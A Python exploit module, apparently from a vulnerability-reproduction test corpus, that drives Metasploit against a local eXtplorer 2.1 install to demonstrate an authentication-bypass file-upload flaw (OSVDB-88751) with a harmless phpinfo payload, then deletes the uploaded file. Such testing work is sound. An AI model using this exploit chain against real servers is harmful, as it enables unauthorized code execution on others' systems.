import sys
import os
import time

import selenium.common.exceptions
import corpus

class Exploit (corpus.Exploit):

    def __init__(self):
        corpus.Exploit.__init__(self, {
                'Name' :        "OSVDB_88751",
                'Description' : "eXtplorer v2.1 Arbitrary File Upload Vulnerability"
                                "This application has an upload feature that allows an authenticated user"
				"with administrator roles to upload arbitrary files to any writable"
				"directory in the web root. This module uses an authentication bypass"
				"vulnerability to upload and execute a file.",
                'References' :  [['OSVDB', '88751']],
                'Target' :      "eXtplorer 2.1",
                'VulWikiPage' : ""
                })
                                
        return
            
    def exploit(self):
        driver = self.create_selenium_driver()

        metasploit_cmd = "metasploit-framework/msfcli multi/http/extplorer_upload_exec RHOST=127.0.0.1 TARGETURI=/extplorer/ PAYLOAD=generic/custom PAYLOADSTR=\'phpinfo();\' E"
        print "Running Metasploit"
        os.system(metasploit_cmd)

        print "Done! Browse to the payload location specified above to see the results."
        driver.cleanup()
        return

    def cleanup(self, system_dir):
        for dirpath,dirnames,files in os.walk(system_dir + "/var/www/extplorer/config"):
            for file in files:
                if file[-4:] == ".php":
                    fd = open(dirpath + '/' + file, 'r')
                    if fd.read(19) == "<?php phpinfo(); ?>":
                        fd.close()
                        print "Removing /var/www/extplorer/config/", file
                        os.system("rm " + system_dir + "/var/www/extplorer/config/" + file)
                        return
                    fd.close()
        return

if __name__ == "__main__":
    engine = corpus.Engine(Exploit())
    engine.parse_args(sys.argv)
